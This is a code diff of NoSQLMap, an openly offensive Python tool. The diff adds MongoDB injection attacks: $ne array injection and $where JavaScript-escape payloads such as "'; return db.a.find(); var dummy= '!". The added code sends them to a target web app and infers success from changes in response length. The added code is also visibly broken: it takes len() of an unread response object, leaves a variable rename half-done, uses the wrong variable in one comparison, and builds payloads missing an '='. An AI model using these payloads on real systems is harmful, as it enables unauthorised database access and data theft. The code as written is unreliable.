@@ -15,7 +15,7 @@ def mainMenu():
 	select = True
 	while select:
 		os.system('clear')
-		print "NoSQLMap v0.04-by Russell Butturini(tcstool@gmail.com)"
+		print "NoSQLMap v0.06-by Russell Butturini(tcstool@gmail.com)"
 		print "\n"
 		print "1-Set options (do this first)"
 		print "2-NoSQL DB Access Attacks"
@@ -204,10 +204,10 @@ def webApps():
 			print "HTTP response varied " + str(randNormDelta) + " bytes with random parameter!\n"
 			
 		print "Testing Mongo PHP not equals associative array injection using " + neqUri +"..."
-		injLength = int(len(urllib.urlopen(neqUri).read()))
+		injLen = int(len(urllib.urlopen(neqUri).read()))
 		print "Got response length of " + str(injLength) + "."
 		
-		randInjDelta = abs(injLength - randLength)
+		randInjDelta = abs(injLen - randLength)
 		
 		if randInjDelta >= 100:
 			print "Not equals injection respnose varied " + str(randInjDelta) + " bytes from random parameter! Injection works!"
@@ -217,6 +217,72 @@ def webApps():
 		
 		elif (randInjDelta == 0):
 			print "Random string response size and not equals injection were the same. Injection did not work."	
+		
+		print "Testing Mongo <2.4 $where all Javascript string escape attack for all records...\n"
+		print " Injecting " + whereStrUri
+		whereStrLen = int(len(urllib.urlopen(whereStrUri)))
+		whereStrDelta = abs(whereStrLen - randLength)
+		
+		if whereStrDelta >= 100:
+			print "Java $where escape varied " + str(whereStrDelta)  + " bytes from random parameter! Where injection works!"
+		
+		elif (whereStrDelta > 0) and (whereStrDelta < 100):
+			print " response variance was only " + str(whereStrDelta) + "bytes.  Injection might have worked but difference is too small to be certain."
+		
+		elif (whereStrDelta == 0):
+			print "Random string response size and $where injection were the same. Injection did not work."
+		
+		print "\n"
+		print "Testing Mongo <2.4 $where Javascript integer escape attack for all records...\n"
+		print " Injecting " + whereIntUri
+		
+		whereIntLen = int(len(urllib.urlopen(whereIntUri)))
+		whereIntDelta = abs(whereIntLen - randLength)
+		
+		if whereIntDelta >= 100:
+			print "Java $where escape varied " + str(whereIntDelta)  + " bytes from random parameter! Where injection works!"
+		
+		elif (whereIntDelta > 0) and (whereIntDelta < 100):
+			print " response variance was only " + str(whereIntDelta) + "bytes.  Injection might have worked but difference is too small to be certain."
+		
+		elif (whereIntDelta == 0):
+			print "Random string response size and $where injection were the same. Injection did not work."
+			
+		#Start a single record attack
+		
+		print "Testing Mongo <2.4 $where all Javascript string escape attack for one record...\n"
+		print " Injecting " + whereOneStr
+		whereOneStrLen = int(len(urllib.urlopen(whereOneStr)))
+		whereOneStrDelta = abs(whereOneStrLen - randLength)
+		
+		if whereOneStrDelta >= 100:
+			print "Java $where escape varied " + str(whereOneStrDelta)  + " bytes from random parameter! Where injection works!"
+		
+		elif (whereOneStrDelta > 0) and (whereOneStrDelta < 100):
+			print " response variance was only " + str(whereOneStrDelta) + "bytes.  Injection might have worked but difference is too small to be certain."
+		
+		elif (whereOneStrDelta == 0):
+			print "Random string response size and $where single injection were the same. Injection did not work."
+		
+		print "\n"
+		print "Testing Mongo <2.4 $where Javascript integer escape attack for one record...\n"
+		print " Injecting " + whereOneInt
+		
+		whereOneIntLen = int(len(urllib.urlopen(whereOneInt)))
+		whereOneIntDelta = abs(whereIntLen - randLength)
+		
+		if whereOneIntDelta >= 100:
+			print "Java $where escape varied " + str(whereOneIntDelta)  + " bytes from random parameter! Where injection works!"
+		
+		elif (whereOneIntDelta > 0) and (whereOneIntDelta < 100):
+			print " response variance was only " + str(whereOneIntDelta) + "bytes.  Injection might have worked but difference is too small to be certain."
+		
+		elif (whereOneIntDelta == 0):
+			print "Random string response size and $where single record injection were the same. Injection did not work."
+			
+		
+		
+		
 		
 		
 		
@@ -232,6 +298,10 @@ def buildUri(origUri, randValue):
 	paramName = []
 	paramValue = []
 	global neqUri
+	global whereStrUri
+	global whereIntUri
+	global whereOneStr
+	global whereOneInt
 	
 	split_uri = origUri.split("?")
 	params = split_uri[1].split("&")
@@ -242,18 +312,32 @@ def buildUri(origUri, randValue):
 		paramValue.append(item[index + 1:len(item)])
 	print "List of parameters:"
 	print "\n".join(paramName)
+	
 	injOpt = raw_input("Which parameter should we inject?")
 	evilUri = split_uri[0] + "?"
 	neqUri = split_uri[0] + "?"
+	whereStrUri = split_uri[0] + "?"
+	whereIntUri = split_uri[0] + "?"
+	whereOneStr = split_uri[0] + "?"
+	whereOneInt = split_uri[0] + "?"
 	x = 0
 	
 	for item in paramName:		
 		if paramName[x] == injOpt:
 			evilUri += paramName[x] + "=" + randValue + "&"
 			neqUri += paramName[x] + "[$ne]=" + randValue + "&"
+			whereStrUri += paramName[x] + "'; return db.a.find(); var dummy= '!" + "&"
+			whereIntUri += paramName[x] + "; return db.a.find();"
+			whereOneStr += paramName[x] + "'; return db.a.findOne(); var dummy= '!" + "&"
+			whereOneInt += paramName[x] + "; return db.a.findOne();" + "&"
 		else:
 			evilUri += paramName[x] + "=" + paramValue[x] + "&"
 			neqUri += paramName[x] + "=" + paramValue[x] + "&"
+			whereStrUri += paramName[x] + "=" + paramValue[x] + "&"
+			whereIntUri += paramName[x] + "=" + paramValue[x] + "&"
+			whereOneStr += paramName[x] + "=" + paramValue[x] + "&"
+			whereOneInt += paramName[x] + "=" + paramValue[x] + "&"
+			
 			
 	#Clip the last & off
 	evilUri = evilUri[:-1]
